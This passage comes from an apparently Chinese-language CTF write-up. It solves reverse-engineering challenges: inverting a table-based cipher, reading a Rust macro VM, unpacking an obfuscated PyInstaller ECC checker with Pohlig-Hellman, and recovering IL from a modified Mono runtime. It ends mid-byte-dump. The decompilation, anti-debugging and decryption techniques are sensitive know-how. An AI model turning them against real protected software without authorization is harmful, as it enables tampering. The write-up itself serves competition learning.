     <span class="hljs-number">57509360</span>, <span class="hljs-number">12159655</span>, <span class="hljs-number">8717460</span>, <span class="hljs-number">32686335</span>, <span class="hljs-number">34266111</span>, <span class="hljs-number">5</span>),
    (
        <span class="hljs-number">33392211</span>, <span class="hljs-number">7979743</span>, <span class="hljs-number">61382021</span>, <span class="hljs-number">35672785</span>, <span class="hljs-number">22833691</span>, <span class="hljs-number">52860393</span>, <span class="hljs-number">8630338</span>, <span class="hljs-number">5700458</span>, <span class="hljs-number">44480266</span>, <span class="hljs-number">18911756</span>, <span class="hljs-number">58513213</span>,
        <span class="hljs-number">27865128</span>,
        <span class="hljs-number">16783819</span>, <span class="hljs-number">18997872</span>, <span class="hljs-number">24282261</span>, <span class="hljs-number">39608187</span>, <span class="hljs-number">276</span>),
    (<span class="hljs-number">28529793</span>, <span class="hljs-number">61959315</span>, <span class="hljs-number">23103319</span>, <span class="hljs-number">11554134</span>, <span class="hljs-number">40628674</span>, <span class="hljs-number">31294575</span>, <span class="hljs-number">17218640</span>, <span class="hljs-number">9249973</span>, <span class="hljs-number">13077670</span>, <span class="hljs-number">50326885</span>, <span class="hljs-number">15741379</span>,
     <span class="hljs-number">4029227</span>, <span class="hljs-number">886406</span>, <span class="hljs-number">55982584</span>, <span class="hljs-number">31034972</span>, <span class="hljs-number">23299004</span>, <span class="hljs-number">165</span>),
    (<span class="hljs-number">2075035</span>, <span class="hljs-number">58384561</span>, <span class="hljs-number">49647471</span>, <span class="hljs-number">24338954</span>, <span class="hljs-number">30588692</span>, <span class="hljs-number">9418491</span>, <span class="hljs-number">38289933</span>, <span class="hljs-number">41390328</span>, <span class="hljs-number">43235505</span>, <span class="hljs-number">26341415</span>, <span class="hljs-number">28645103</span>,
     <span class="hljs-number">50452614</span>, <span class="hljs-number">39840129</span>, <span class="hljs-number">61149522</span>, <span class="hljs-number">4371300</span>, <span class="hljs-number">32579505</span>, <span class="hljs-number">217</span>),
    (<span class="hljs-number">39948186</span>, <span class="hljs-number">19156834</span>, <span class="hljs-number">31133287</span>, <span class="hljs-number">30084536</span>, <span class="hljs-number">35248885</span>, <span class="hljs-number">26835402</span>, <span class="hljs-number">25602134</span>, <span class="hljs-number">34823251</span>, <span class="hljs-number">1866553</span>, <span class="hljs-number">48298737</span>, <span class="hljs-number">52095831</span>,
     <span class="hljs-number">14841955</span>, <span class="hljs-number">24081438</span>, <span class="hljs-number">52610483</span>, <span class="hljs-number">8163681</span>, <span class="hljs-number">29828862</span>, <span class="hljs-number">207</span>),
    (<span class="hljs-number">620322</span>, <span class="hljs-number">1371418</span>, <span class="hljs-number">41109851</span>, <span class="hljs-number">26104149</span>, <span class="hljs-number">44652087</span>, <span class="hljs-number">52819211</span>, <span class="hljs-number">39349501</span>, <span class="hljs-number">9965987</span>, <span class="hljs-number">31002578</span>, <span class="hljs-number">31387649</span>, <span class="hljs-number">53199974</span>, <span class="hljs-number">20246162</span>,
     <span class="hljs-number">16795502</span>, <span class="hljs-number">33373239</span>, <span class="hljs-number">36682310</span>, <span class="hljs-number">60508155</span>, <span class="hljs-number">1</span>),
    (<span class="hljs-number">0x1d60734</span>,<span class="hljs-number">0x3f49d23</span>,<span class="hljs-number">0x19dcd96</span>,<span class="hljs-number">0x1e6e5ea</span>,<span class="hljs-number">0x3d01ef4</span>,<span class="hljs-number">0xe35c9</span>,<span class="hljs-number">0x240b433</span>,<span class="hljs-number">0x16aa43e</span>,<span class="hljs-number">0x1c13291</span>,<span class="hljs-number">0x23edd00</span>,<span class="hljs-number">0x2bdc439</span>,<span class="hljs-number">0x25bb3fc</span>,<span class="hljs-number">0x11a1801</span>,<span class="hljs-number">0x2f2339b</span>,<span class="hljs-number">0x5093eb</span>,<span class="hljs-number">0x1ce4ecf</span>, <span class="hljs-number">0x15</span>),
]

M = Matrix(F, dats)
y = M[:,<span class="hljs-number">-1</span>]
M = M[:,:<span class="hljs-number">-1</span>]
<span class="hljs-comment">#print(M)</span>
x = M.solve_right(y)
<span class="hljs-keyword">assert</span> M*x == y
print(x.list())</code></pre><p>解出来是 [201, 247, 36, 211, 26, 224, 241, 131, 112, 24, 2, 0, 17, 243, 56, 186]</p>
<p>然后需要做 func1 的逆变换
func1 总共对输入数据进行9次变换，每次以4字节为一组做如下查表操作
input 4 bytes -&gt; ((table3 + table5) + (table4 + table5)) -&gt; output 4 bytes</p>
<p>观察一下 table5 可以发现是 xor</p>
<p>另外 (table3+table5) 和 (table4+table5) 本质上是一样的操作，只是table3和table4数值不同</p>
<p>它们的约束形式都是  table[x0] ^ table[x1] ^ table[x2] ^ table[x3] = const</p>
<p>其中 x0,x1,x2,x3 都是 8 bit 整数，各自用的table是不同的
可以用 meet in the middle 方法来解</p>
<p>枚举 (x0, x1) pair，把 table[x0]^table[x1] 存到哈希表里
枚举 (x2, x3) pair，用 table[x2]^table[x3]^const 查询哈希表
就能找到正确的 x0,x1,x2,x3</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> List
<span class="hljs-keyword">from</span> tables <span class="hljs-keyword">import</span> *


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re_func2</span><span class="hljs-params">(inp: List[int])</span>:</span>
    table = (<span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>)
    out = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):
        out[i] = inp[table[i]]
    <span class="hljs-keyword">return</span> out


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inv_table</span><span class="hljs-params">(tab, val: List[int])</span>:</span>
    val = (val[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (val[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (val[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | val[<span class="hljs-number">3</span>]
    t0 = dict()
    <span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> enumerate(tab[<span class="hljs-number">0</span>]):
        <span class="hljs-keyword">for</span> j, y <span class="hljs-keyword">in</span> enumerate(tab[<span class="hljs-number">1</span>]):
            v = x ^ y
            t0[v] = (i, j)
    t1 = dict()
    <span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> enumerate(tab[<span class="hljs-number">2</span>]):
        <span class="hljs-keyword">for</span> j, y <span class="hljs-keyword">in</span> enumerate(tab[<span class="hljs-number">3</span>]):
            v = x ^ y
            t1[v] = (i, j)
    ans = []
    <span class="hljs-keyword">for</span> v0, pos0 <span class="hljs-keyword">in</span> t0.items():
        v1 = v0 ^ val
        <span class="hljs-keyword">if</span> v1 <span class="hljs-keyword">in</span> t1:
            pos1 = t1[v1]
            ans.append([*pos0, *pos1])
    <span class="hljs-keyword">assert</span> len(ans) == <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> ans[<span class="hljs-number">0</span>]


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re_func1</span><span class="hljs-params">(inp: List[int])</span>:</span>
    inp = [t1[i].tolist().index(inp[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>)]
    inp = re_func2(inp)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> reversed(range(<span class="hljs-number">9</span>)):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> reversed(range(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span>)):
            tmp = inv_table(table4[i][j:j+<span class="hljs-number">4</span>], inp[j:j+<span class="hljs-number">4</span>])
            inp[j:j+<span class="hljs-number">4</span>] = inv_table(table3[i][j:j+<span class="hljs-number">4</span>], tmp)
        inp = re_func2(inp)
    <span class="hljs-keyword">return</span> inp


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    inp = [<span class="hljs-number">201</span>, <span class="hljs-number">247</span>, <span class="hljs-number">36</span>, <span class="hljs-number">211</span>, <span class="hljs-number">26</span>, <span class="hljs-number">224</span>, <span class="hljs-number">241</span>, <span class="hljs-number">131</span>, <span class="hljs-number">112</span>, <span class="hljs-number">24</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">243</span>, <span class="hljs-number">56</span>, <span class="hljs-number">186</span>]
    print(re_func1(inp))</code></pre><p>解出来是 [188, 148, 96, 177, 114, 49, 199, 227, 116, 190, 88, 116, 39, 204, 63, 26]</p>
<p>转成16进制</p>
<p>flag:inctf{bc9460b17231c7e374be587427cc3f1a}</p>
<p class="img-container"><img src="https://i.imgur.com/he2Axzl.png" alt=""></p>
<h3 id="babyrust"><a class="header-link" href="#babyrust"></a>Babyrust</h3>
<p>Rust宏定义写的一个简单vm，根据字符串的内容，对 $Never, $Gone, $Give三个变量进行变化</p>
<p>修改代码如下，然后编译</p>
<pre class="hljs"><code>    (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna say goodbye $($code:tt)*)) =&gt; {
        $Gonna = $Never[$Give];
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Gonna = Never[Give: {}]: {}"</span>, $Give, $Never[$Give]);
        check!(@e ($Never,$Gonna,$Give); ($($code)*));
    };
    (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna tell a lie and hurt you $($code:tt)*)) =&gt; {
        $Never[$Give] = $Gonna;
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Never[Give: {}] = Gonna: {}"</span>, $Give, $Gonna);
        check!(@e ($Never,$Gonna,$Give); ($($code)*));
    };

    <span class="hljs-keyword">let</span> result = check!(@s n1ctf{<span class="hljs-number">00000000000000000000000000000000</span>});</code></pre><p>由于只有加减法，明文与密文每一位之间的差值是固定的</p>
<pre class="hljs"><code>cipher = [<span class="hljs-number">148</span>, <span class="hljs-number">59</span>, <span class="hljs-number">143</span>, <span class="hljs-number">112</span>, <span class="hljs-number">121</span>, <span class="hljs-number">186</span>, <span class="hljs-number">106</span>, <span class="hljs-number">133</span>, <span class="hljs-number">55</span>, <span class="hljs-number">90</span>, <span class="hljs-number">164</span>, <span class="hljs-number">166</span>, <span class="hljs-number">167</span>, <span class="hljs-number">121</span>, <span class="hljs-number">174</span>, <span class="hljs-number">147</span>, <span class="hljs-number">148</span>,
 <span class="hljs-number">167</span>, <span class="hljs-number">99</span>, <span class="hljs-number">86</span>, <span class="hljs-number">81</span>, <span class="hljs-number">161</span>, <span class="hljs-number">151</span>, <span class="hljs-number">149</span>, <span class="hljs-number">132</span>, <span class="hljs-number">56</span>, <span class="hljs-number">88</span>, <span class="hljs-number">188</span>, <span class="hljs-number">141</span>, <span class="hljs-number">127</span>, <span class="hljs-number">151</span>, <span class="hljs-number">63</span>]
fake_cipher = [<span class="hljs-number">131</span>, <span class="hljs-number">53</span>, <span class="hljs-number">124</span>, <span class="hljs-number">109</span>, <span class="hljs-number">118</span>, <span class="hljs-number">165</span>, <span class="hljs-number">89</span>, <span class="hljs-number">131</span>, <span class="hljs-number">50</span>, <span class="hljs-number">83</span>, <span class="hljs-number">163</span>, <span class="hljs-number">149</span>, <span class="hljs-number">165</span>, <span class="hljs-number">104</span>, <span class="hljs-number">153</span>, <span class="hljs-number">145</span>, <span class="hljs-number">142</span>, <span class="hljs-number">149</span>, <span class="hljs-number">77</span>, <span class="hljs-number">69</span>, <span class="hljs-number">60</span>, <span class="hljs-number">154</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">115</span>, <span class="hljs-number">54</span>, <span class="hljs-number">69</span>, <span class="hljs-number">168</span>, <span class="hljs-number">133</span>, <span class="hljs-number">105</span>, <span class="hljs-number">146</span>, <span class="hljs-number">59</span>]
<span class="hljs-keyword">for</span> c, f <span class="hljs-keyword">in</span> zip(cipher, fake_cipher):
    <span class="hljs-keyword">print</span> (chr(c - f + <span class="hljs-number">48</span>), end=<span class="hljs-string">''</span>)
<span class="hljs-comment"># A6C33EA2571A2AE26BFAE7BEA2CD8F54</span></code></pre><h3 id="py"><a class="header-link" href="#py"></a>Py</h3>
<p>首先解elf文件，能在目录下得到两个pyc
修改文件头，<code>0a5n.py</code> 为</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> L
<span class="hljs-keyword">from</span> var <span class="hljs-keyword">import</span> *

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_format</span><span class="hljs-params">(flag)</span>:</span>
    <span class="hljs-keyword">if</span> len(flag) != <span class="hljs-number">28</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:
        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789abcdef'</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>


v1 = L.c1(v1, v2, v3)
v6 = L.c2(v1, v4, v5)
k = input(<span class="hljs-string">'flag:'</span>)
<span class="hljs-keyword">if</span> check_format(k) == <span class="hljs-keyword">True</span>:
    v2 = L.f3(k)
    v3 = v2 - v6
    <span class="hljs-keyword">if</span> v3.a2 == g1 <span class="hljs-keyword">and</span> v3.a3 == g2:
        print(<span class="hljs-string">'Congratulations! n1ctf{%s}'</span> + k)</code></pre><p>L.py 中有乱码，还原字节码能得到两个exec</p>
<pre class="hljs"><code>z = <span class="hljs-string">''</span>.join([chr(i ^ <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> z])
exec(z)</code></pre><p>实际还原出来是 &lt;&lt;运算，柑橘z中的数据猜测实际为^
是一个smc</p>
<pre class="hljs"><code>key = <span class="hljs-number">0</span>
libc = ctypes.CDLL(<span class="hljs-string">"libc.so.6"</span>)
_ptrace = libc.ptrace
key=_ptrace(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)
_memcpy = libc.memcpy
key += <span class="hljs-number">1</span>
address=id(f1.__code__.co_code)+bytes.__basicsize__<span class="hljs-number">-1</span>
codes=list(f1.__code__.co_code)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(codes)):codes[i]^=key
codes=bytearray(codes)
buff=(ctypes.c_byte*len(codes)).from_buffer(codes)
_memcpy(ctypes.c_char_p(address),ctypes.cast(buff,ctypes.POINTER(ctypes.c_char)),ctypes.c_int(len(codes)))</code></pre><p>手动patch一下pyc文件，uncompyle6反编译后自己修复一下变量名，发现很多函数的逻辑很奇怪，根据刚才异或运算被解释成了左移运算，题目中的vm可能对基础运算符的opcode进行了相互的调换</p>
<p>通过使用的参数和函数的形式，猜测应该是个ECC算法，对其进行还原</p>
<p>0a5n.py:</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> L
<span class="hljs-keyword">from</span> var <span class="hljs-keyword">import</span> *

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_format</span><span class="hljs-params">(flag)</span>:</span>
    <span class="hljs-keyword">if</span> len(flag) != <span class="hljs-number">28</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:
        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789abcdef'</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>

v1 = L.c1(v1, v2, v3)
v6 = L.c2(v1, v4, v5)
k = input(<span class="hljs-string">'flag:'</span>)
<span class="hljs-keyword">if</span> check_format(k) == <span class="hljs-keyword">True</span>:
    v2 = L.f3(k)
    v3 = v2 * v6
    <span class="hljs-keyword">if</span> v3.a2 == g1 <span class="hljs-keyword">and</span> v3.a3 == g2:
        print(<span class="hljs-string">'Congratulations! n1ctf{%s}'</span> % k)</code></pre><p>L.py:</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inv_mod</span><span class="hljs-params">(b, p)</span>:</span>
    <span class="hljs-keyword">if</span> b &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &lt;= b:
        b = b % p
    c, d = b, p
    uc, vc, ud, vd, temp = <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> c != <span class="hljs-number">0</span>:
        temp = c
        q, c, d = d // c, d % c, temp
        uc, vc, ud, vd = ud - q * uc, vd - q * vc, uc, vc

    <span class="hljs-keyword">assert</span> d == <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> ud &gt; <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> ud
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> ud + p

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leftmost_bit</span><span class="hljs-params">(x)</span>:</span>
    <span class="hljs-keyword">assert</span> x &gt; <span class="hljs-number">0</span>
    result = <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span> result &lt;= x:
        result = <span class="hljs-number">2</span> * result
    <span class="hljs-keyword">return</span> result // <span class="hljs-number">2</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Curve</span><span class="hljs-params">(object)</span>:</span>  <span class="hljs-comment"># c1</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, p, a, b)</span>:</span>
        var4 = p
        var4 ^= <span class="hljs-number">0x10000000000000000000000000000000000000000L</span>
        self.p = var4
        var5 = a
        var5 -= <span class="hljs-number">1</span>
        var5 //= <span class="hljs-number">2</span>
        self.a = var5
        var6 = b
        var6 //= <span class="hljs-number">2</span>
        var6 += <span class="hljs-number">1</span>
        self.b = var6

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s1</span><span class="hljs-params">(self, x, y)</span>:</span>  <span class="hljs-comment"># 判断是否在曲线上</span>
        <span class="hljs-keyword">return</span> (y * y) - (x * x * x + self.a * x + self.b) % self.p == <span class="hljs-number">0</span>


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span><span class="hljs-params">(object)</span>:</span>   <span class="hljs-comment"># c2</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, curve: Curve, x, y, order=None)</span>:</span>
        self.curve = curve
        self.x = x
        self.y = y
        self.order = order
        <span class="hljs-keyword">if</span> self.a1:
            <span class="hljs-keyword">assert</span> self.a1.s1(x, y)
        <span class="hljs-keyword">if</span> order:
            <span class="hljs-keyword">assert</span> self * order == g1

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span><span class="hljs-params">(self, other)</span>:</span>
        <span class="hljs-keyword">if</span> self.curve == other.curve <span class="hljs-keyword">and</span> self.x == other.x <span class="hljs-keyword">and</span> self.y == other.y:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__add__</span><span class="hljs-params">(self, other)</span>:</span>
        <span class="hljs-keyword">if</span> other == g1:
            <span class="hljs-keyword">return</span> self
        <span class="hljs-keyword">if</span> self == g1:
            <span class="hljs-keyword">return</span> other
        <span class="hljs-keyword">assert</span> self.curve == other.curve
        <span class="hljs-keyword">if</span> self.x == other.x:
            <span class="hljs-keyword">if</span> (self.y + other.y) % self.curve.p == <span class="hljs-number">0</span>:
                <span class="hljs-keyword">return</span> g1
            <span class="hljs-keyword">return</span> self.s1()
        p = self.curve.p
        l = other.y % self.y - inv_mod(other.x % self.x, p) + p
        x3 = (l * l - self.x - other.x) % p
        y3 = (l * (self.x - x3) - self.y) % p
        <span class="hljs-keyword">return</span> Point(self.curve, x3, y3)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__mul__</span><span class="hljs-params">(self, other)</span>:</span>
        e = other
        <span class="hljs-keyword">if</span> self.order:
            e = e + self.order
        <span class="hljs-keyword">if</span> e == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> g1
        <span class="hljs-keyword">if</span> self == g1:
            <span class="hljs-keyword">return</span> g1
        e3 = <span class="hljs-number">3</span> * e
        negative_self = Point(self.curve, self.x, -self.y, self.order)
        i = leftmost_bit(e3) ** <span class="hljs-number">2</span>
        result = self
        <span class="hljs-keyword">while</span> i &gt; <span class="hljs-number">1</span>:
            result = result.s1()
            <span class="hljs-keyword">if</span> e3 &amp; i != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> e &amp; i == <span class="hljs-number">0</span>:
                result = result + self
            <span class="hljs-keyword">if</span> e3 &amp; i == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> e &amp; i != <span class="hljs-number">0</span>:
                result = result + negative_self
            i = i // <span class="hljs-number">2</span>

        <span class="hljs-keyword">return</span> result

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__rmul__</span><span class="hljs-params">(self, other)</span>:</span>
        <span class="hljs-keyword">return</span> self * other

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s1</span><span class="hljs-params">(self)</span>:</span>   <span class="hljs-comment"># double函数</span>
        <span class="hljs-keyword">if</span> self == g1:
            <span class="hljs-keyword">return</span> g1
        p = self.curve.p <span class="hljs-comment"># 曲线的p</span>
        a = self.curve.a <span class="hljs-comment"># 曲线的a</span>
        l = (<span class="hljs-number">3</span> * self.x * self.x + a) * inv_mod(<span class="hljs-number">2</span> * self.y, p) % p   <span class="hljs-comment"># 加法的lambda</span>
        x3 = (l * l) - (<span class="hljs-number">2</span> * self.x) % p                            <span class="hljs-comment"># 加法的x_3</span>
        y3 = ((l * (self.x - x3)) - self.y) % p                    <span class="hljs-comment"># 加法的y_3</span>
        <span class="hljs-keyword">return</span> Point(self.curve, x3, y3)


g1 = Point(<span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>)   <span class="hljs-comment"># g1是INFINITY</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f3</span><span class="hljs-params">(var0)</span>:</span>
    var1 = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> var0[::<span class="hljs-number">-1</span>]:
        var1 = (var1 &lt;&lt; <span class="hljs-number">4</span>) | int(i, <span class="hljs-number">16</span>)
    <span class="hljs-keyword">return</span> var1</code></pre><p>接下来只需要寻找 from var import * 中的var即可
根据pyinstxtractor.py的报错，发现magic number和python3.5差了1，于是将工具的检查去掉，用python3.5进行解包，可以得到var.pyc.encrypt</p>
<p>手动解密</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> zlib
<span class="hljs-keyword">import</span> tinyaes

key = <span class="hljs-string">'nu1lnu1lnu1lnu1l'</span>

obj = open(<span class="hljs-string">'var.pyc.encrypted'</span>, <span class="hljs-string">'rb'</span>).read()
cipher = tinyaes.AES(key.encode(), obj[:<span class="hljs-number">16</span>])
obj = cipher.CTR_xcrypt_buffer(obj[<span class="hljs-number">16</span>:])

obj = zlib.decompress(obj)

open(<span class="hljs-string">'var.pyc'</span>, <span class="hljs-string">'wb'</span>).write(obj)</code></pre><p>得到ECC的曲线和点</p>
<pre class="hljs"><code><span class="hljs-attr">p</span> = <span class="hljs-number">0</span>xfffffffffffffffffffffffffffffffeffffac73
<span class="hljs-attr">a</span> = <span class="hljs-number">0</span>xfffffffffffffffffffffffffffffffeffffac71
<span class="hljs-attr">b</span> = <span class="hljs-number">0</span>x21

<span class="hljs-attr">Px</span> = <span class="hljs-number">0</span>xf6f8b692899e1b4c5c82580820c2c7cb5597e12e
<span class="hljs-attr">Py</span> = <span class="hljs-number">0</span>xafb7be2af28b649dab76337b42ee310119413529

<span class="hljs-attr">Qx</span> = <span class="hljs-number">0</span>x4945e0d8dc57e88d5949f84bf09943f572dbebb1
<span class="hljs-attr">Qy</span> = <span class="hljs-number">0</span>xb1bf040fe1939c7144341d3af61f36d63f47e272</code></pre><p>sage实现Pohlig-Hellman进行求解</p>
<pre class="hljs"><code>p = <span class="hljs-number">0xfffffffffffffffffffffffffffffffeffffac73</span>
a = <span class="hljs-number">0xfffffffffffffffffffffffffffffffeffffac71</span>
b = <span class="hljs-number">0x21</span>

P = (<span class="hljs-number">0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e</span>, <span class="hljs-number">0xafb7be2af28b649dab76337b42ee310119413529</span>)
Q = (<span class="hljs-number">0x4945e0d8dc57e88d5949f84bf09943f572dbebb1</span>, <span class="hljs-number">0xb1bf040fe1939c7144341d3af61f36d63f47e272</span>)

F = FiniteField(p)
E = EllipticCurve(F, [a, b])
P = E.point(P)
Q = E.point(Q)

print(factor(P.order()))

primes = [<span class="hljs-number">2</span>^<span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">17</span>, <span class="hljs-number">79</span>, <span class="hljs-number">4457</span>, <span class="hljs-number">40591</span>, <span class="hljs-number">585977563</span>, <span class="hljs-number">1460624777797</span>, <span class="hljs-number">5490618741917</span>]

dlogs = []
<span class="hljs-keyword">for</span> fac <span class="hljs-keyword">in</span> primes:
    t = int(P.order()) // int(fac)
    dlog = discrete_log(t*Q,t*P, operation=<span class="hljs-string">"+"</span>)
    dlogs += [dlog]
    print(<span class="hljs-string">"factor: "</span>+str(fac)+<span class="hljs-string">", Discrete Log: "</span>+str(dlog))

crt(dlogs, primes)</code></pre><p>得到的结果计算十六进制并反转就是最后的flag</p>
<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
<h3 id="missingfunction"><a class="header-link" href="#missingfunction"></a>MissingFunction</h3>
<p>是unity游戏,mono虚拟机</p>
<p>这是个被重新编译后的mono,在jit编译的时候替换了encode函数</p>
<p>jit函数地址:mono.dll+1B4290,有混淆,不分析他</p>
<p>先断mono.dll+1B468D,在堆栈上获取method_header指针,调试器修改此处代码变成call mono_method_header_get_code,参数填入method_header,然后申请一块内存接收大小,得到原先的encode函数的ilcode</p>
<pre class="hljs"><code><span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>1D<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>33<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>14<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>DA<span class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>0F<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>1C<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>0E<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>34<span class="hljs-symbol">\x</span>DC<span class="hljs-symbol">\x</span>F4<span class="hljs-symbol">\x</span>F4<span class="hljs-symbol">\x</span>F4<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>1B<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>03<span 